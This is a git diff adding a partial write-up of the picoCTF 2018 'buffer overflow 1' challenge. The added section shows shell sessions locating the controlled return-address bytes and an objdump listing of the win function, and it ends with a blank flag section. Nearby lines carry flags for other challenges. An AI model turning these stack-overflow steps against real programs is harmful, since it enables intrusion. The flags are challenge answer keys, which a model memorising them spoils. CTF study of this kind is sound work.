@@ -50,6 +50,7 @@ Secret Agent                 Web              200     picoCTF{s3cr3t_ag3nt_m4n_1
 Truly an Artist              Forensics        200
 be-quick-or-be-dead-1        Reversing        200
 blaise's cipher              Cryptography     200     picoCTF{v1gn3r3_c1ph3rs_ar3n7_bad_cdf08bf0}
+buffer overflow 1            Binary Exploit   200
 leak-me                      Binary Exploit   200
 now you don't                Forensics        200     picoCTF{n0w_y0u_533_m3}
 shellcode                    Binary Exploit   200
@@ -1398,6 +1399,54 @@ Gilbert Vernam tried to repair the broken cipher (creating the Vernam–Vigenere
 ```
 picoCTF{v1gn3r3_c1ph3rs_ar3n7_bad_cdf08bf0}
 ```
+
+## Binary Exploitation 200: buffer overflow 1
+
+**Challenge**
+Okay now you're cooking! This time can you overflow the buffer and return to the flag function in this program? You can find it in /problems/buffer-overflow-1_2_86cbe4de3cdc8986063c379e61f669ba on the shell server. [Source.](writeupfiles/vuln-buff-overflow-1.c)
+
+**Solution**
+Using an entirely manual binary search we find out which bytes we actually control:
+```
+hxr@pico-2018-shell-1:/problems/buffer-overflow-1_2_86cbe4de3cdc8986063c379e61f669ba$ ./vuln
+Please enter your string:
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaab
+Okay, time to return... Fingers Crossed... Jumping to 0x62616161
+Segmentation fault
+...
+hxr@pico-2018-shell-1:/problems/buffer-overflow-1_2_86cbe4de3cdc8986063c379e61f669ba$ ./vuln
+Please enter your string:
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaadcba
+Okay, time to return... Fingers Crossed... Jumping to 0x61626364
+Segmentation fault
+```
+
+Ok, good. Now we have control of the return, we just need to point it to wherever the flag is printed? I guess that's the win function
+
+```
+$ objdump -x -d vuln
+....
+
+080485cb <win>:
+ 80485cb:       55                      push   %ebp
+ 80485cc:       89 e5                   mov    %esp,%ebp
+ 80485ce:       83 ec 58                sub    $0x58,%esp
+ 80485d1:       83 ec 08                sub    $0x8,%esp
+ 80485d4:       68 50 87 04 08          push   $0x8048750
+ 80485d9:       68 52 87 04 08          push   $0x8048752
+ 80485de:       e8 bd fe ff ff          call   80484a0 <fopen@plt>
+ 80485e3:       83 c4 10                add    $0x10,%esp
+ 80485e6:       89 45 f4                mov    %eax,-0xc(%ebp)
+ 80485e9:       83 7d f4 00             cmpl   $0x0,-0xc(%ebp)
+ 80485ed:       75 1a                   jne    8048609 <win+0x3e>
+ 80485ef:       83 ec 0c                sub    $0xc,%esp
+...
+```
+
+So we want to return to there?
+
+**Flag**
+
 
 ## Binary Exploitation 200: leak-me
 
